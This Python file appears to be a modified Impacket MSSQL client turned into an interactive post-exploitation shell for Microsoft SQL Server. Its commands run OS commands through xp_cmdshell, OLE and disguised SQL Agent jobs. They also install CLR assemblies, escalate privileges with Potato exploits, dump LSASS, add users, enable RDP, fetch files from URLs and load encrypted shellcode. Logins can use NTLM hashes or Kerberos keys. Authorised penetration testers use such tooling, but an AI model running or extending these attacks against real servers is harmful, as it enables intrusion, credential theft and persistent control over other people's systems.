#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   [MS-TDS] & [MC-SQLR] example.
#
# Author:
#   Alberto Solino (@agsolino)
#
# Reference for:
#   Structure
#

from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging
import random
import string

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from libs import tds
from libs.sqltools import sql_op

if __name__ == '__main__':
    import cmd

    class SQLSHELL(cmd.Cmd):
        def __init__(self, SQL, show_queries=False, codec="GBK"):
            cmd.Cmd.__init__(self)
            self.sql = SQL
            self.show_queries = show_queries
            self.at = []
            self.set_prompt()
            self.codec = codec
            self.intro = '[!] Press help for extra shell commands'
            self.sql_op: sql_op = sql_op(self.sql, show_queries=self.show_queries, codec=self.codec)

        def do_help(self, line):
            print("""
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    sp_oacreate {cmd}          - executes cmd using sp_oacreate
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    enable_ole                 - you know what it means
    disable_ole                - you know what it means
    upload {local} {remote}    - upload a local file to a remote path (OLE required)
    download {remote} {local}  - download a remote file to a local path (OLE required)
    enable_clr                 - you know what it means
    disable_clr                - you know what it means
    install_clr                - create assembly and procedure
    uninstall_clr              - drop clr
    clr_pwd                    - print current directory by clr
    clr_ls {directory}         - list files by clr
    clr_cd {directory}         - change directory by clr
    clr_ps                     - list process by clr
    clr_netstat                - netstat by clr
    clr_ping {host}            - ping by clr
    clr_cat {file}             - view file contents by clr
    clr_rm {file}              - delete file by clr
    clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
    clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
    clr_badpotato {cmd}        - exec by BadPotato like clr_exec
    clr_godpotato {cmd}        - exec by GodPotato like clr_exec
    clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
    clr_dumplsass {path}       - dumplsass by clr
    clr_rdp                    - check RDP port and Enable RDP
    clr_getav                  - get anti-virus software on this machin by clr
    clr_adduser {user} {pass}  - add user by clr
    clr_download {url} {path}  - download file from url by clr
    clr_scloader {code} {key}  - encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
    clr_scloader1 {file} {key} - encrypt Shellcode by Encrypt.py and Upload Payload.txt
    clr_scloader2 {remotefile} - upload Payload.bin to target before Shellcode Loader
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonate
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
     """)

        def postcmd(self, stop, line):
            self.set_prompt()
            return stop

        def do_enable_ole(self, line):
            self.sql_op.enable_ole()

        def do_disable_ole(self ,line):
            self.sql_op.disable_ole()

        def do_enable_clr(self ,line):
            self.sql_op.enable_clr()

        def do_disable_clr(self ,line):
            self.sql_op.disable_clr()

        def do_upload(self, line):
            input = line.split(" ")
            if len(input) != 2:
                print("Example: upload /etc/passwd c:\\1.txt")
                return
            local, remote = input
            self.sql_op.file_upload(local, remote)
    
        def do_download(self, line):
            input = line.split(" ")
            if len(input) != 2:
                print("Example: download c:\\1.txt /tmp/1.txt")
                return
            remote, local = input
            self.sql_op.file_doanload(remote, local)

        # def do_clr_assembly(self, line):
        #     input = line.split(" ")
        #     if len(input) < 1 or len(line) == 0 :
        #         print("Example: clr_assembly /tmp/Rubeus.exe -h")
        #         return
        #     # TODO
        #     # self.sql_op.execute_assembly(input)

        def do_install_clr(self, line):
            self.sql_op.install_clr()

        def do_uninstall_clr(self, line):
            self.sql_op.drop_crl()

        def do_clr_pwd(self, line):
            self.sql_op.clr_exec("clr_pwd")
    
        def do_clr_ls(self, line):
            self.sql_op.clr_exec("clr_ls "+ line)
        
        def do_clr_cat(self, line):
            self.sql_op.clr_exec("clr_cat " + line)

        def do_clr_dumplsass(self, line):
            self.sql_op.clr_exec("clr_dumplsass "+ line)
            
        def do_clr_cd(self, line):
            self.sql_op.clr_exec("clr_cs "+ line)
        
        def do_clr_rm(self, line):
            self.sql_op.clr_exec("clr_rm "+ line)

        def do_clr_ping(self, line):
            self.sql_op.clr_exec("clr_ping "+ line)

        def do_clr_netstat(self, line):
            self.sql_op.clr_exec("clr_netstat")

        def do_clr_rdp(self, line):
            self.sql_op.clr_exec("clr_rdp")            
        
        def do_clr_getav(self, line):
            self.sql_op.clr_exec("clr_getav")     

        def do_clr_ps(self, line):
            self.sql_op.clr_exec("clr_ps")      

        def do_clr_adduser(self, line):
            self.sql_op.clr_exec("clr_adduser "+ line)    

        def do_clr_exec(self, line):
            self.sql_op.clr_exec("clr_exec "+ line)    

        def do_clr_efspotato(self, line):
            self.sql_op.clr_exec("clr_efspotato "+ line)    

        def do_clr_badpotato(self, line):
            self.sql_op.clr_exec("clr_badpotato "+ line) 
        
        def do_clr_godpotato(self, line):
            self.sql_op.clr_exec("clr_godpotato "+ line) 

        def do_clr_scloader(self, line):
            self.sql_op.clr_exec("clr_scloader "+ line)    

        def do_clr_scloader1(self, line):
            self.sql_op.clr_exec("clr_scloader1 "+ line)    
        

        def do_clr_scloader2(self, line):
            self.sql_op.clr_exec("clr_scloader2 "+ line)    
        
        def do_clr_download(self, line):
            self.sql_op.clr_exec("clr_download "+ line)    
        
        def do_clr_combine(self, line):
            self.sql_op.clr_exec("clr_combine "+ line)    

        def set_prompt(self):
            try:
                row = self.sql_query('select system_user + SPACE(2) + current_user as "username"', False)
                username_prompt = row[0]['username']
            except:
                username_prompt = '-'
            if self.at is not None and len(self.at) > 0:
                at_prompt = ''
                for (at, prefix) in self.at:
                    at_prompt += '>' + at
                self.prompt = 'SQL %s (%s@%s)> ' % (at_prompt, username_prompt, self.sql.currentDB)
            else:
                self.prompt = 'SQL (%s@%s)> ' % (username_prompt, self.sql.currentDB)

        def do_show_query(self, s):
            self.show_queries = True
            self.sql_op = sql_op(self.sql, show_queries=self.show_queries, codec=self.codec)

        def do_mask_query(self, s):
            self.show_queries = False
            self.sql_op = sql_op(self.sql, show_queries=self.show_queries, codec=self.codec)

        def execute_as(self, exec_as):
            if self.at is not None and len(self.at) > 0:
                (at, prefix) = self.at[-1:][0]
                self.at = self.at[:-1]
                self.at.append((at, exec_as))
            else:
                self.sql_query(exec_as)
                self.sql.printReplies()

        def do_exec_as_login(self, s):
            exec_as = "execute as login='%s';" % s
            self.execute_as(exec_as)

        def do_exec_as_user(self, s):
            exec_as = "execute as user='%s';" % s
            self.execute_as(exec_as)

        def do_use_link(self, s):
            if s == 'localhost':
                self.at = []
            elif s == '..':
                self.at = self.at[:-1]
            else:
                self.at.append((s, ''))
                row = self.sql_query('select system_user as "username"')
                self.sql.printReplies()
                if len(row) < 1:
                    self.at = self.at[:-1]

        def sql_query(self, query, show=True):
            if self.at is not None and len(self.at) > 0:
                self.sql_op = sql_op(self.sql, show_queries=self.show_queries, at=self.at, codec=self.codec)
                for (linked_server, prefix) in self.at[::-1]:
                    query = "EXEC ('" + prefix.replace("'", "''") + query.replace("'", "''") + "') AT " + linked_server
            if self.show_queries and show:
                print('[%%] %s' % query)
            return self.sql.sql_query(query)

        def do_shell(self, s):
            os.system(s)

        def do_xp_dirtree(self, s):
            try:
                self.sql_query("exec master.sys.xp_dirtree '%s',1,1" % s)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_xp_cmdshell(self, s):
            try:
                self.sql_query("exec master..xp_cmdshell '%s'" % s)
                self.sql.printReplies()
                self.sql.colMeta[0]['TypeData'] = 80*2
                self.sql.printRows()
            except:
                pass

        def do_sp_start_job(self, s):
            try:
                ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
                self.sql_query("DECLARE @job NVARCHAR(100);"
                                   "SET @job='{}'+CONVERT(NVARCHAR(36),NEWID());"
                                   "EXEC msdb..sp_add_job @job_name=@job,@description='INDEXDEFRAG',"
                                   "@owner_login_name='sa',@delete_level=3;"
                                   "EXEC msdb..sp_add_jobstep @job_name=@job,@step_id=1,@step_name='Defragmentation',"
                                   "@subsystem='CMDEXEC',@command='{}',@on_success_action=1;"
                                   "EXEC msdb..sp_add_jobserver @job_name=@job;"
                                   "EXEC msdb..sp_start_job @job_name=@job;".format(ran_str, s))
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_sp_oacreate(self, s):
            try:
                self.sql_op.sp_shell(s)
            except:
                pass

        def do_lcd(self, s):
            if s == '':
                print(os.getcwd())
            else:
                os.chdir(s)

        def do_enable_xp_cmdshell(self, line):
            try:
                self.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                                   "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_disable_xp_cmdshell(self, line):
            try:
                self.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure "
                               "'show advanced options', 0 ;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_enum_links(self, line):
            self.sql_query("EXEC sp_linkedservers")
            self.sql.printReplies()
            self.sql.printRows()
            self.sql_query("EXEC sp_helplinkedsrvlogin")
            self.sql.printReplies()
            self.sql.printRows()

        def do_enum_users(self, line):
            self.sql_query("EXEC sp_helpuser")
            self.sql.printReplies()
            self.sql.printRows()

        def do_enum_db(self, line):
            try:
                self.sql_query("SELECT dbid, name, crdate, filename from master.dbo.sysdatabases;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_sql(self, line):
            try:
                self.sql_query(line)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_enum_owner(self, line):
            try:
                self.sql_query("SELECT name [Database], suser_sname(owner_sid) [Owner] FROM sys.databases")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_enum_impersonate(self, line):
            try:
                self.sql_query("select name from sys.databases")
                result = []
                for row in self.sql.rows:
                    result_rows = self.sql_query("use " + row['name'] + "; SELECT 'USER' as 'execute as', DB_NAME() "
                                                                        "AS 'database',pe.permission_name,"
                                                                        "pe.state_desc, pr.name AS 'grantee', "
                                                                        "pr2.name AS 'grantor' "
                                                                        "FROM sys.database_permissions pe "
                                                                        "JOIN sys.database_principals pr ON "
                                                                        "  pe.grantee_principal_id = pr.principal_Id "
                                                                        "JOIN sys.database_principals pr2 ON "
                                                                        "  pe.grantor_principal_id = pr2.principal_Id "
                                                                        "WHERE pe.type = 'IM'")
                    if result_rows:
                        result.extend(result_rows)
                result_rows = self.sql_query("SELECT 'LOGIN' as 'execute as', '' AS 'database',pe.permission_name,"
                                             "pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' "
                                             "FROM sys.server_permissions pe JOIN sys.server_principals pr "
                                             "  ON pe.grantee_principal_id = pr.principal_Id "
                                             "JOIN sys.server_principals pr2 "
                                             "  ON pe.grantor_principal_id = pr2.principal_Id "
                                             "WHERE pe.type = 'IM'")
                result.extend(result_rows)
                self.sql.printReplies()
                self.sql.rows = result
                self.sql.printRows()
            except:
                pass

        def do_enum_logins(self, line):
            try:
                self.sql_query("select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, "
                               "sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, "
                               "sl.bulkadmin from  master.sys.server_principals r left join master.sys.syslogins sl "
                               "on sl.sid = r.sid where r.type in ('S','E','X','U','G')")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def default(self, line):
            try:
                self.sql_query(line)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def emptyline(self):
            pass

        def do_exit(self, line):
            return True

    parser = argparse.ArgumentParser(add_help = True, description = "TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, help='whether or not to use Windows '
                                                                                  'Authentication (default False)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-show', action='store_true', help='show the queries')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"GBK"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the SQL shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)
    print(version.BANNER)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    ms_sql = tds.MSSQL(address, int(options.port))
    ms_sql.connect()
    try:
        if options.k is True:
            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                                       kdcHost=options.dc_ip)
        else:
            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False
    if res is True:
        shell = SQLSHELL(ms_sql, options.show, options.codec)
        if options.file is None:
            shell.cmdloop()
        else:
            for line in options.file.readlines():
                print("SQL> %s" % line, end=' ')
                shell.onecmd(line)
    ms_sql.disconnect()